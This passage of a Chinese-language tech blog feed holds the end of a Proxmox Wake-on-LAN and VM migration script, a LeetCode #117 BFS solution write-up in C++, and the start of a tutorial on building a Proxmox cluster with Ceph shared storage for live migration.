migration...&quot;</span></span><br><span class="line">    qm migrate <span class="variable">$VM_ID</span> <span class="variable">$BACKUP_NODE</span> --online</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;VM <span class="variable">$VM_ID</span> successfully migrated to backup node <span class="variable">$BACKUP_NODE</span> (<span class="variable">$BACKUP_NODE_IP</span>).&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;Power consumption is normal (<span class="variable">$POWER_CONSUMPTION</span> W) on <span class="variable">$NODE</span>.&quot;</span></span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure><p>這裡新增了 retry 機制，在透過命令發送 Magic Packet後，會嘗試去 ping 主機，看是否存活，那當然我確定我沒有檔ICMP packet，所以開機後按理來說一定ping 的到，最大重試次數為12次，每次 retry 中間等10秒，因此最久會等2分鐘。</p><blockquote><p>這裡的數字設定只是為了實驗方便，實際運作看是否要改成 backoff retry 都是看個人決定~</p></blockquote><p>這裡實驗想反過來，先把節點1 <code>PVE</code> 關機</p><p><img src="/img/PVE/exp1.png"></p><p>後續在節點2 <code>PVE2</code> 執行上面的腳本，一如預期， <strong>首先會先去檢查1分鐘內的CPU平均功耗是否大於閥值(6瓦特)</strong> ，這裡一定會大於，因此之後會去喚醒 <code>pve</code> 節點，之後會持續去 ping 節點1，在 retry 了兩次後，節點 <code>pve</code> 可用，開始進行 migration，後續也成功完成 migrations。</p><p><img src="/img/PVE/exp2.png"></p><p><img src="/img/PVE/exp3.png"></p><blockquote><p>如果觀察 Ubuntu VM 的 Memory 指標可以發現會出現斷層，這就是移轉過程中預期會出現的 downtime 。 以前在 AWS 處理 MQ 問題的時候也會發現在 maintenance windows 期間某些實例的記憶體或CPU 指標也會有這樣的斷層，這通常代表底層實例替換或重啟，其原因可能是要做 maintenance 或者security patch</p></blockquote><h1 id="結語"><a href="#結語" class="headerlink" title="結語"></a>結語</h1><p>這篇文章做了簡單的小實驗，<strong>從PVE Cluster 中的一個節點喚醒了相同LAN的其他PVE節點並且進行動態 migration，那如果後續有多一台主機可用</strong>，我會介紹 PVE 中的 HA(High Availability) Cluster 的使用。</p><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p>IPMI watchdog<br><a href="https://blog.jason.tools/2019/02/pve-ipmi-watchdog.html">https://blog.jason.tools/2019/02/pve-ipmi-watchdog.html</a></p><p>qm<br><a href="https://pve.proxmox.com/pve-docs/qm.1.html">https://pve.proxmox.com/pve-docs/qm.1.html</a></p>]]></content>
      
      
      <categories>
          
          <category> 實作紀錄 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Proxmox VE </tag>
            
            <tag> Virtual Machine </tag>
            
            <tag> Infrastructure </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>填充每個節點的右側指標 II| Medium | LeetCode#117. Populating Next Right Pointers in Each Node II</title>
      <link href="/posts/d0f655d4.html"/>
      <url>/posts/d0f655d4.html</url>
      
        <content type="html"><![CDATA[<h1 id="題目敘述"><a href="#題目敘述" class="headerlink" title="題目敘述"></a>題目敘述</h1><p><img src="/img/LeetCode/117/question1.jpeg"><br><img src="/img/LeetCode/117/question2.jpeg"></p><ul><li>題目難度：<code>Medium</code></li><li>題目敘述： 題目會給 Binary Tree 的節點，節點結構如下，除了 <code>*left</code>, <code>*right</code> pointer 之外，還多了一個 <code>*next</code> 指標，用於指向該層中右方的節點，而如果右方節點不存在，則 <code>*next</code> 指向 <code>NULL</code></li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">Node</span> &#123;</span><br><span class="line">  <span class="type">int</span> val;</span><br><span class="line">  Node *left;</span><br><span class="line">  Node *right;</span><br><span class="line">  Node *next;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上圖中的例子中，題目會依序給 Binary Tree 的節點 <code>[1,2,3,4,5,null,7]</code> 而輸出結果也如圖，節點 <code>1</code> 沒有右邊節點，所以它的 <code>*next</code> 指向 <code>NULL</code>。再來就是下一層，節點 <code>2</code> 的下一個是節點 <code>3</code>，而節點 <code>3</code> 沒有右邊節點，所以會是指向 NULL</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(1) -&gt; NULL</span><br><span class="line">(2) -&gt; (3) -&gt; NULL</span><br><span class="line">(4) -&gt; (5) -&gt; (7) -&gt; NULL</span><br></pre></td></tr></table></figure><h1 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h1><h2 id="一開始的想法"><a href="#一開始的想法" class="headerlink" title="一開始的想法"></a>一開始的想法</h2><p>看到這個題目的第一想法就是 BFS，因為題目要求要找右邊節點，而這個操作都會在相同 level 去做，因此我在想可以用之解 BFS 題目中計算 level 的相同方式，來去順便將當前節點的 next 指向同一層的下一個節點，這可以透過 Queue 輕易做到，因為之前建構 BFS 也習慣將每一層節點由左至右的 push 進 queue 當中。</p><h2 id="我的解法"><a href="#我的解法" class="headerlink" title="我的解法"></a>我的解法</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">// Definition for a Node.</span></span><br><span class="line"><span class="comment">class Node &#123;</span></span><br><span class="line"><span class="comment">public:</span></span><br><span class="line"><span class="comment">    int val;</span></span><br><span class="line"><span class="comment">    Node* left;</span></span><br><span class="line"><span class="comment">    Node* right;</span></span><br><span class="line"><span class="comment">    Node* next;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    Node() : val(0), left(NULL), right(NULL), next(NULL) &#123;&#125;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    Node(int _val) : val(_val), left(NULL), right(NULL), next(NULL) &#123;&#125;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    Node(int _val, Node* _left, Node* _right, Node* _next)</span></span><br><span class="line"><span class="comment">        : val(_val), left(_left), right(_right), next(_next) &#123;&#125;</span></span><br><span class="line"><span class="comment">&#125;;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">Node* <span class="title">connect</span><span class="params">(Node* root)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(root == <span class="literal">NULL</span>) <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">        queue&lt;Node*&gt; q;</span><br><span class="line">        q.<span class="built_in">push</span>(root);</span><br><span class="line">        <span class="keyword">while</span>(!q.<span class="built_in">empty</span>())&#123;</span><br><span class="line">            <span class="type">int</span> level = q.<span class="built_in">size</span>();</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; level; i++)&#123;</span><br><span class="line">                Node *current = q.<span class="built_in">front</span>();</span><br><span class="line">                q.<span class="built_in">pop</span>();</span><br><span class="line">                <span class="keyword">if</span>(i == level<span class="number">-1</span>)&#123;</span><br><span class="line">                    current-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span>&#123;</span><br><span class="line">                    current-&gt;next = q.<span class="built_in">front</span>();</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(current-&gt;left) q.<span class="built_in">push</span>(current-&gt;left);</span><br><span class="line">                <span class="keyword">if</span>(current-&gt;right) q.<span class="built_in">push</span>(current-&gt;right);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> root;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>可以看到整體架構輪廓都是 BFS，但是在操作相同層節點的時候 (for 迴圈那邊)多了一個判斷</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(i == level<span class="number">-1</span>)&#123;</span><br><span class="line">    current-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    current-&gt;next = q.<span class="built_in">front</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>一旦輪到同一層的最右邊元素，就將它的 <code>*next</code> 指向 NULL，而其他節點就指向當前 queue 的 front 節點，由於 <code>current</code> 所代表的節點在 queue 中已經被 pop 出來，因此目前 queue 中的節點會是下一個節點</p><h3 id="執行結果"><a href="#執行結果" class="headerlink" title="執行結果"></a>執行結果</h3><p><img src="/img/LeetCode/117/result.jpeg"></p><h2 id="更好的寫法"><a href="#更好的寫法" class="headerlink" title="更好的寫法"></a>更好的寫法</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">// Definition for a Node.</span></span><br><span class="line"><span class="comment">class Node &#123;</span></span><br><span class="line"><span class="comment">public:</span></span><br><span class="line"><span class="comment">    int val;</span></span><br><span class="line"><span class="comment">    Node* left;</span></span><br><span class="line"><span class="comment">    Node* right;</span></span><br><span class="line"><span class="comment">    Node* next;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    Node() : val(0), left(NULL), right(NULL), next(NULL) &#123;&#125;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    Node(int _val) : val(_val), left(NULL), right(NULL), next(NULL) &#123;&#125;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    Node(int _val, Node* _left, Node* _right, Node* _next)</span></span><br><span class="line"><span class="comment">        : val(_val), left(_left), right(_right), next(_next) &#123;&#125;</span></span><br><span class="line"><span class="comment">&#125;;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">Node* <span class="title">connect</span><span class="params">(Node* root)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(root == <span class="literal">NULL</span>) <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">        queue&lt;Node*&gt; q;</span><br><span class="line">        q.<span class="built_in">push</span>(root);</span><br><span class="line">        q.<span class="built_in">push</span>(<span class="literal">NULL</span>);</span><br><span class="line">        <span class="keyword">while</span>(q.<span class="built_in">size</span>()&gt;<span class="number">1</span>)&#123;</span><br><span class="line">            Node* current = q.<span class="built_in">front</span>();</span><br><span class="line">            q.<span class="built_in">pop</span>();</span><br><span class="line">            <span class="keyword">if</span>(!current)&#123;</span><br><span class="line">                q.<span class="built_in">push</span>(<span class="literal">NULL</span>);</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            current-&gt;next = q.<span class="built_in">front</span>();</span><br><span class="line">            <span class="keyword">if</span>(current-&gt;left) q.<span class="built_in">push</span>(current-&gt;left);</span><br><span class="line">            <span class="keyword">if</span>(current-&gt;right) q.<span class="built_in">push</span>(current-&gt;right);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> root;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>其實大同小異，但就更加簡潔一些．這裡沒有判斷層，而是一但在 BFS 過程中 queue 為空的，就代表那一層結束，則 push NULL，然後這時就可以直接 <code>current-&gt;next = q.front()</code>，就少了許多判斷式</p><h1 id="複雜度"><a href="#複雜度" class="headerlink" title="複雜度"></a>複雜度</h1><h2 id="時間複雜度"><a href="#時間複雜度" class="headerlink" title="時間複雜度"></a>時間複雜度</h2><p>$O(N)＄</p><h2 id="空間複雜度"><a href="#空間複雜度" class="headerlink" title="空間複雜度"></a>空間複雜度</h2><p>$O(N)＄</p>]]></content>
      
      
      <categories>
          
          <category> LeetCode筆記 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LeetCode </tag>
            
            <tag> C++ </tag>
            
            <tag> Binary Tree </tag>
            
            <tag> Medium </tag>
            
            <tag> Traversal </tag>
            
            <tag> Linked List </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>實作 Proxmox VE VM 的 Live Migrations | PVE 系列-1</title>
      <link href="/posts/c5581068.html"/>
      <url>/posts/c5581068.html</url>
      
        <content type="html"><![CDATA[<!-- ---Part3# High Availability (HA)# 設定 HA Group --> <h1 id="Proxmox-VE-介紹"><a href="#Proxmox-VE-介紹" class="headerlink" title="Proxmox VE 介紹"></a>Proxmox VE 介紹</h1><p><strong>Proxmox VE(PVE) 是一個開源的虛擬化環境</strong>，能夠同時支援基於 LXC (Linux Container) 的容器，抑或是基於Kernel 的VM，即為 <a href="https://zh.wikipedia.org/wiki/%E5%9F%BA%E4%BA%8E%E5%86%85%E6%A0%B8%E7%9A%84%E8%99%9A%E6%8B%9F%E6%9C%BA"><strong>KVM</strong></a>，也就是將 Linux Kernel 作為 Hypervisor 的虛擬化技術。</p><p><img src="/img/PVE/Single_PVE.png"></p><p>而 Proxmox 也透過介於 Host 與 Guest 的 <a href="https://zh.wikipedia.org/wiki/QEMU">QEMU</a> 去處理 Guest 的硬體請求，將其轉譯給真正的硬體，搭配KVM 一起運作可帶來指令處理效能上的提升。因此可以以近乎本地環境的速度來去進行虛擬化。</p><h1 id="實體節點設定"><a href="#實體節點設定" class="headerlink" title="實體節點設定"></a>實體節點設定</h1><h2 id="Proxmox-VE-images-燒錄"><a href="#Proxmox-VE-images-燒錄" class="headerlink" title="Proxmox VE images 燒錄"></a>Proxmox VE images 燒錄</h2><p><img src="/img/PVE/image.png"></p><p>這裡準備好 USB　將 Proxmox VE 的 iso image 放置其中，我選擇  <strong>Proxmox VE 7.4 ISO Installer</strong></p><blockquote><p>PVE Image <a href="https://www.proxmox.com/en/downloads/proxmox-virtual-environment/iso">官網下載處</a></p></blockquote><p>接著就是要準備節點，並且在個別主機上調整開機順序，進到 BIOS 後將 USB 調整成第一順位，<strong>接著可以順便檢查一下BIOS 中的 KVM 有沒有 Enable，一定要先去 Enable</strong>。我的環境下，可在 BIOS 設定中的 Advanced 中找到 <strong>Intel Virtualization Technology</strong> ，接著就 Enable</p><p><img src="/img/PVE/bios.jpeg"></p><p>之後正常開機後就會跳安裝導覽，就依序進行安裝就好。安裝完畢後透過網頁登入架設的節點後。就可以來建立 Cluster 了~</p><h1 id="建立-Clusters"><a href="#建立-Clusters" class="headerlink" title="建立 Clusters"></a>建立 Clusters</h1><h2 id="確認節點資訊"><a href="#確認節點資訊" class="headerlink" title="確認節點資訊"></a>確認節點資訊</h2><p>目前有兩個節點，在建立 Cluster 之前會需要確認一下 <strong>&#x2F;etc&#x2F;hosts</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">節點 1</span><br><span class="line">172.25.166.68 pve.oplab.io pve</span><br><span class="line">節點 2</span><br><span class="line">172.25.166.42 pve2.oplab.io pve2</span><br></pre></td></tr></table></figure><h2 id="開始建立"><a href="#開始建立" class="headerlink" title="開始建立"></a>開始建立</h2><p>首先進到節點1 <strong>Datacenter</strong> 的找到 <strong>Cluster</strong> 後就選擇 Create Cluster</p><p><img src="/img/PVE/cluster1.png"></p><p>接著幫 Cluster 取名，這裡叫做 <code>LabCluster</code>，並且選擇你的 Cluster Network，接著按下 Create。</p><p><img src="/img/PVE/cluster2.png"></p><p>建立完成後的畫面會是這樣，可以看到節點 1 <code>pve</code> 被加入 cluster 當中。</p><p><img src="/img/PVE/cluster3.png"></p><p>接著我們必須將其他節點 Join 到這個 Cluster 當中。可以在 <strong>Cluster</strong> 當中找到 <strong>Join Information</strong> 可以先將這 show 出來的資訊複製起來。</p><p><img src="/img/PVE/join.png"></p><p><img src="/img/PVE/join2.png"></p><p>接著就會需要到第二個節點 <code>pve2</code> (我這裡是另一台主機) 來去加入 Cluster，這裡一樣在 <strong>Cluster</strong> 中找到 <strong>Join Information</strong>，接著填入剛才複製的 join 資訊。 <strong>加入完畢後，就可以在兩台節點都看見彼此了。</strong></p><p><img src="/img/PVE/view1.png"></p><p><img src="/img/PVE/view2.png"></p><p>接著如果這時候心急去建立一個VM 然後就以為能 migrate 那就錯了，這時候你的 backup 節點就會因為找不到你VM 的 Config file 而報錯，像下面這樣</p><p><img src="/img/PVE/fail.png"></p><p>沒錯，要能夠進行 Migration 還有兩個條件：</p><ul><li>VM Config file 要在節點間 Shared 或者是更完整一點， <strong>VM Disk 要能夠 Shared</strong></li><li><strong>另外還有一點，用於建立VM 的 iso image 也要是 shared 的</strong></li></ul><blockquote><p>為了實現這兩項目的，就必須要能夠有 shared storage 的 solution</p></blockquote><h1 id="Migration-流程"><a href="#Migration-流程" class="headerlink" title="Migration 流程"></a>Migration 流程</h1><p><img src="/img/PVE/mg1.png"></p><p>到這裡來補充一下我們這次進行 Migration 的流程，這一篇我們會手動用在PVE介面上進行 migration，主要就是兩台 PVE 節點，預先建立好共享儲存架構，並且基於這個架構去建立虛擬機，再將這個虛擬機從一個節點轉移到另一個節點。</p><blockquote><p>所以接著就要來透過 Ceph 來建立儲存的架構了。</p></blockquote><h1 id="Ceph-介紹"><a href="#Ceph-介紹" class="headerlink" title="Ceph 介紹"></a>Ceph 介紹</h1><blockquote><p>Ceph的儲存叢集（Ceph Storage Cluster），又稱為<code>RADOS</code>（<strong>R</strong>eliable, <strong>A</strong>utonomic <strong>D</strong>istributed <strong>O</strong>bject <strong>S</strong>tore）它提供了一個可靠、能自我管理的分散式物件儲存區。採C++開發，這個叢集是居於Ceph架構底層的軟體儲存系統，整個環境的資料都放在這裡，具有自我修復與管理的能力，並且是以自動運作的OSD儲存節點，以及輕量的Monitor監控程式組成。</p></blockquote><h2 id="Ceph-的元件"><a href="#Ceph-的元件" class="headerlink" title="Ceph 的元件"></a>Ceph 的元件</h2><ul><li>Ceph OSDs<ul><li>Ceph 的daemon (<code>ceph-osd</code>)</li><li>用於儲存資料，處理資料複製、恢復等</li><li>通過檢查 ceph-osd 的 heartbeat 來向 Ceph Monitor 提供監控資訊</li><li><strong>對於高可用性(High Availiablity, HA)  以及 冗餘(Redundancy) 目的:  至少需要 3 個 Ceph OSDs</strong></li></ul></li><li>Monitors<ul><li><code>ceph-mon</code></li><li>維護展示集群狀態的圖表，包含監視圖、OSD圖</li><li>負責管理 daemon 和 client 之間的身份驗證</li><li><strong>對於高可用性(High Availiablity, HA)  以及 冗餘(Redundancy) 目的:  至少需要 3 個 Ceph Monitors</strong></li></ul></li><li>Managers<ul><li><code>ceph-mgr</code></li><li>負責跟蹤 runtime 指標和 Ceph Cluster 當前狀態 Ex. 儲存利用率、當前系統負載</li><li><strong>對於高可用性(High Availiablity, HA)  以及 冗餘(Redundancy) 目的:  至少需要 2 個 Ceph Managers</strong></li></ul></li><li>MDSs:<ul><li>Ceph Metadata Server (Ceph MDS) 為Ceph 檔案系統儲存 metadata<ul><li>也就是說 如果是Ceph block device, Ceph object storage 則不使用 MDS</li></ul></li><li><strong>如果要建立 Ceph Filesystem (Cephfs)，也需要事先建立 MSD</strong></li><li>Ceph MDS 使 POSIX 文件系統使用者可在不對 Ceph 儲存 cluster 造成負擔的狀況下執行像是 <code>ls</code> 或者 <code>find</code> 命令</li></ul></li></ul><blockquote><p> Ceph 會是一種分散式儲存系統，它的底層由多臺伺服器組成的叢集環境支撐 (也就是我們剛才架設的 PVE Cluster)。如果你需要擴充儲存空間或提升系統規模，只要再加入更多的伺服器到叢集中即可，這讓擴展變得非常簡單。在這種架構下，Ceph 有很高的可靠性，系統會自動進行修復和管理。當資料寫入時，會自動複製到多個節點上，<strong>這樣即使某個節點出現故障，整個系統依然能正常運作，資料也不會損壞。</strong> 這樣的設計讓 Ceph 能夠提供穩定且安全的儲存解決方案。</p></blockquote><h2 id="安裝-Ceph"><a href="#安裝-Ceph" class="headerlink" title="安裝 Ceph"></a>安裝 Ceph</h2><p>先在每個節點中都安裝 Ceph，這裡有兩個節點，那就兩個節點都要安裝</p><p><img src="/img/PVE/ceph1.png"></p><p>點選 <strong>Start quincy installatio</strong>  (這裡沒特別指定版本，就用它給的)</p><p><img src="/img/PVE/ceph2.png"></p><p>下載過程，會提示是否繼續，就 <code>Y</code></p><p><img src="/img/PVE/ceph3.png"></p><p>完成後會接續要你指定網路介面</p><p><img src="/img/PVE/ceph4.png"></p><p>安裝成功後，會提示你接下來的步驟，而我們也會照這個步驟做:</p><ul><li>在每個節點都要安裝 Ceph</li><li>添加額外的  Ceph Monitor</li><li>為每個節點建立 Ceph OSD</li><li>建立 Ceph Pool</li></ul><p><img src="/img/PVE/ceph5.png"></p><blockquote><p>在其他節點重複上面的安裝流程， 一旦每個節點都安裝好後，這時候去看 Health 應該會是 warning <code>OSD count 0 &lt; osd_pool_default_size 3</code> 這是正常的，因為還沒建立 OSD<br><img src="/img/PVE/warn.png"></p></blockquote><h2 id="建立-Ceph-OSD"><a href="#建立-Ceph-OSD" class="headerlink" title="建立 Ceph OSD"></a>建立 Ceph OSD</h2><p>為了建立 Ceph OSD，勢必先要有閒置的硬碟空間。所以這裡，要先在每個節點中找到硬碟進行設定。首先進入 <code>pve</code> 節點中的 <strong>Disk</strong>，將閒置硬碟格式化，如果沒有閒置硬碟也可以用USB外接。</p><p><img src="/img/PVE/osd1.png"></p><p>接著去 <strong>PVE</strong> &gt; <strong>Ceph</strong> &gt; <strong>OSD</strong> 底下點選 <strong>Create: OSD</strong> 然後選擇剛剛格式化的硬碟，接著就點選 <strong>Create</strong></p><p><img src="/img/PVE/osd2.png"></p><p>我們在其他節點也進行一樣的步驟來安裝OSD</p><p><img src="/img/PVE/osd3.png"></p><p>安裝好後，可以在兩個節點的 <strong>OSD</strong> 中都看到 osd 的種類跟狀態</p><p><img src="/img/PVE/osd4.png"></p><blockquote><p>另外，為了冗餘和高可用性，可以額外建立兩個 Ceph Manager (Active-Standy)</p></blockquote><div class="note info flat"><p>根據 <a href="https://kawsing.gitbook.io/opensystem/andoid-shou-ji/pomoxve/ceph-object-storage/ceph-xu-yao-da-liang-ji-yi-ti">這篇</a> 的建議:</p><ul><li><code>ceph-osd</code> Process 在執行過程中會消耗CPU資源，所以一般會為每一個 <code>ceph-osd</code> 程序繫結一個CPU核上。</li><li><code>ceph-mon</code> Process 並不十分消耗CPU資源，所以不必為 <code>ceph-mon</code> Process預留過多的CPU資源。</li><li><code>ceph-msd</code> 也是非常消耗CPU資源的，所以需要提供更多的CPU資源。</li><li><code>ceph-mon</code> 和 <code>ceph-mds</code> 需要2G記憶體，每個 <code>ceph-osd</code> Process 需要1G記憶體，2G更好。</li></ul></div><h2 id="建立-Ceph-Pool"><a href="#建立-Ceph-Pool" class="headerlink" title="建立 Ceph Pool"></a>建立 Ceph Pool</h2><p>Ceph Pool 會用來 Combined 不同節點之間的 OSD，這也會是我們後續 VM Disk 存放的地方。在 <code>pve</code> 節點中，我們進入 <strong>Ceph</strong> &gt; <strong>Pools</strong>，選擇 <strong>Create: Ceph Pool</strong>，這裡要給定pool名稱，這裡叫它 <code>syncbricks-ceph</code>。 另外也需要指定 Pool Size，正常來說 Min.Size 最低就是2，而 Size 預設會是 3，但由於我目前只有兩台主機，因此 size 先用2。讓兩個OSD加入倒Ceph Pool。</p><p><img src="/img/PVE/pool1.png"></p><p>建立好後應該會跳 warning，因為PVE預設會希望有 3個 OSD 但目前只有兩個</p><p><img src="/img/PVE/pool2.png"><br><img src="/img/PVE/pool3.png"></p><p>可以目前 online 的 OSD 有兩個，那目前為止就是正常。另外， Ceph Pool 建立好後，可以發現兩個節點底下多出了 <code>syncbricks-ceph</code>。這樣之後兩個節點就可以共享 VM Disk，以利後續的 VM Migration</p><p><img src="/img/PVE/pool4.png"></p><p><img src="/img/PVE/pool5.png"></p><h2 id="建立-Ceph-File-System"><a href="#建立-Ceph-File-System" class="headerlink" title="建立 Ceph File System"></a>建立 Ceph File System</h2><p><img src="/img/PVE/cephfs.svg"></p><blockquote><p><strong>Ceph File System (CephFS)</strong> 是一個符合 POSIX 標準的檔案系統，構建在 <strong>Ceph 分散式物件存儲系統 RADOS</strong> 之上。CephFS 的目標是為各種應用提供高可用且具高效能的檔案儲存 Solution，可用於高效能計算 (HPC) 暫存區，以及分散式工作流程的共享存儲</p></blockquote><blockquote><p>CephFS 的架構上，檔案的 metadata 被儲存在獨立於檔案資料的 RADOS 資料池中，並透過可彈性擴展的 MDS Cluster 提供服務，這樣就可以支援更高吞吐量的 workload。client <strong>可以直接存取 RADOS 讀寫檔案資料區塊</strong>，從而使 workload 能夠隨著底層 RADOS 物件存儲的規模來進行線性擴展，這個過程也不需要任何 gateway 或 agent 來中介資料 I&#x2F;O</p></blockquote><blockquote><p>資料的存取由 MDS Cluster 負責協調，這些 MDS 管理分散式的 metadata cache，client端會和 MDS 會一起維護metadata的狀態。MDS 將metadata變更整合後，高效寫入 RADOS 的日誌中，不會在本地儲存任何metadata。這種設計讓客戶端在 POSIX 檔案系統下能快速且一致地協作</p></blockquote><p>介紹結束後就開始繼續實作，到目前為止，已經處理好共享 VM 硬碟的方式，接著要進行 VM ISO Image 的共享，如果沒有進行共享，後續再進行 migration 就會跳出下面的錯誤訊息， <code>Can&#39;t migrate VM with local CD/DVD</code> 這就代表需要用 shared 的方式進行</p><p><img src="/img/PVE/warn2.png"></p><blockquote><p>根據<a href="https://forum.proxmox.com/threads/ceph-mount-a-pg-pool-for-images-isos.134367/">這篇</a> 要能夠共享 iso image 至少需要進行下面步驟:</p></blockquote><ol><li><strong>Create Ceph File System</strong>：<ul><li>確保已經創建了Ceph FS，並且有至少兩個 MDS 待命</li></ul></li><li><strong>Add Ceph FS</strong>：<ul><li>在節點上掛載Ceph FS，這樣所有節點都可以共享相同的ISO image</li></ul></li></ol><h3 id="建立-MDS"><a href="#建立-MDS" class="headerlink" title="建立 MDS"></a>建立 MDS</h3><p>因此我們分別為兩個節點都建立 MDS</p><p><img src="/img/PVE/meta1.png"></p><p><img src="/img/PVE/meta2.png"></p><p>接著我們在節點1 當中 <strong>Create: Ceph FS</strong>，取名為 <code>cephfs</code>。</p><p><img src="/img/PVE/fs1.png"></p><p>建立好後，兩邊節點就會出現 <code>cephdfs</code> ，接著就可以上傳 iso image 到 shared file system，我這裡上傳的是 Ubuntu 22.04 Desktop 的映像檔</p><p><img src="/img/PVE/fs2.png"></p><h1 id="建立-VM-進行測試"><a href="#建立-VM-進行測試" class="headerlink" title="建立 VM 進行測試"></a>建立 VM 進行測試</h1><p>這次選在 <code>pve</code> 節點中建立 Ubuntu VM，在建立過程中，在設定 <strong>OS</strong> 的時候，選擇 **Use CD&#x2F;DVD disc image file(iso)**，然後 <strong>Storage</strong> 選擇剛剛建立的 Ceph 檔案系統 <code>cephfs</code>，接著 Filesystem 中想要用的 image</p><p><img src="/img/PVE/vm1.png"></p><p>當建立流程進行到 <strong>Disks</strong> 的部分，記得要將 <strong>Storage</strong> 設定為剛剛建立的 <code>syncbricks-ceph</code> </p><p><img src="/img/PVE/vm2.png"></p><p>接著就是建立 VM</p><p><img src="/img/PVE/vm3.png"></p><blockquote><p>建立好後，就需要進入 VM 當中去安裝 Ubuntu，這部分就不贅述了~</p></blockquote><h1 id="手動測試-Migration"><a href="#手動測試-Migration" class="headerlink" title="手動測試 Migration"></a>手動測試 Migration</h1><p>我們可以在 VM 建立好後，在 <code>pve</code> 